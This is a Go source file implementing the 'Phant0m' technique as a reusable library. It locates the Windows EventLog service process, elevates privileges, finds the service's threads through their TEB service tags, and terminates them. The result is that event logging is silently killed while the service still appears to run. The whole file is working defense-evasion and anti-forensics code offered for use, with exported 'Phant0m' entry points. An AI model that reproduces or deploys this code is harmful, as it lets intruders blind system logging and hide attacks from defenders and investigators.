package core

import (
	"errors"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func GetEventLogPid() (uint32, error) {
	var ssp windows.SERVICE_STATUS_PROCESS
	var dwBytesNeeded uint32

	scm, err := windows.OpenSCManager(
		nil,
		nil,
		windows.SERVICE_QUERY_STATUS,
	)
	if err != nil {
		return 0, err
	}

	eventlog, _ := syscall.UTF16PtrFromString("EventLog")
	svc, err := windows.OpenService(
		scm,
		eventlog,
		windows.SERVICE_QUERY_STATUS,
	)
	if err != nil {
		return 0, err
	}

	err = windows.QueryServiceStatusEx(
		svc,
		windows.SC_STATUS_PROCESS_INFO,
		(*byte)(unsafe.Pointer(&ssp)),
		uint32(unsafe.Sizeof(ssp)),
		&dwBytesNeeded,
	)
	if err != nil {
		windows.CloseServiceHandle(svc)
		windows.CloseServiceHandle(scm)
		return 0, err
	}

	return ssp.ProcessId, nil
}

// Recommended function
func Phant0m(eventlog_pid uint32) error {
	return phant0m(eventlog_pid, false)
}

// This function does the same but also prints threads IDs
func Phant0mWithOutput(eventlog_pid uint32) error {
	return phant0m(eventlog_pid, true)
}

// Main function
func phant0m(eventlog_pid uint32, verbose bool) error {
	err := ElevateProcessToken()
	if err != nil {
		return err
	}

	ntdll := windows.NewLazyDLL("ntdll.dll")
	NtQueryInformationThread := ntdll.NewProc("NtQueryInformationThread")

	advapi32 := windows.NewLazyDLL("advapi32.dll")
	I_QueryTagInformation := advapi32.NewProc("I_QueryTagInformation")

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	OpenThread := kernel32.NewProc("OpenThread")
	OpenProcess := kernel32.NewProc("OpenProcess")
	TerminateThread := kernel32.NewProc("TerminateThread")
	CloseHandle := kernel32.NewProc("CloseHandle")
	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	Thread32First := kernel32.NewProc("Thread32First")

	var hThreads uintptr
	hThreads, _, _ = CreateToolhelp32Snapshot.Call(
		windows.TH32CS_SNAPTHREAD,
		0,
	)

	if hThreads == 0 {
		return errors.New("An error has occurred calling CreateToolhelp32Snapshot")
	}

	tbi := PTHREAD_BASIC_INFORMATION{}
	te32 := windows.ThreadEntry32{}
	te32.Size = uint32(unsafe.Sizeof(te32))

	Thread32First.Call(
		hThreads,
		uintptr(unsafe.Pointer(&te32)),
	)

	for true {
		if te32.OwnerProcessID == eventlog_pid {
			hEvtThread, _, _ := OpenThread.Call(
				windows.THREAD_QUERY_LIMITED_INFORMATION|windows.THREAD_SUSPEND_RESUME|windows.THREAD_TERMINATE,
				uintptr(0),
				uintptr(te32.ThreadID),
			)

			if hEvtThread == 0 {
				return errors.New("An error has occurred calling OpenThread")
			}

			NtQueryInformationThread.Call(
				uintptr(hEvtThread),
				0,
				uintptr(unsafe.Pointer(&tbi)),
				0x30,
				0,
			)

			hEvtProcess, _, _ := OpenProcess.Call(
				windows.PROCESS_VM_READ,
				uintptr(0),
				uintptr(te32.OwnerProcessID),
			)

			if hEvtProcess == 0 {
				fmt.Println("2")
				return errors.New("An error has occurred calling OpenProcess")
			}

			if tbi.pTebBaseAddress != 0 {
				scTagQuery := SC_SERVICE_TAG_QUERY{}

				var hTag byte
				var pN uintptr
				ReadProcessMemory.Call(
					hEvtProcess,
					tbi.pTebBaseAddress+0x1720,
					uintptr(unsafe.Pointer(&hTag)),
					unsafe.Sizeof(pN),
					0,
				)

				scTagQuery.processId = te32.OwnerProcessID
				scTagQuery.serviceTag = uint32(hTag)

				I_QueryTagInformation.Call(
					0,
					1, // ServiceNameFromTagInformation
					uintptr(unsafe.Pointer(&scTagQuery)),
				)

				if scTagQuery.pBuffer != nil {
					if verbose {
						fmt.Println("  Thread found:", te32.ThreadID)
					}

					TerminateThread.Call(
						uintptr(hEvtThread),
						0,
					)
				}

				CloseHandle.Call(hEvtThread)
				CloseHandle.Call(hEvtProcess)
			}
		}

		err := windows.Thread32Next(
			windows.Handle(hThreads),
			&te32,
		)

		if err != nil {
			break
		}
	}

	CloseHandle.Call(hThreads)

	return nil
}
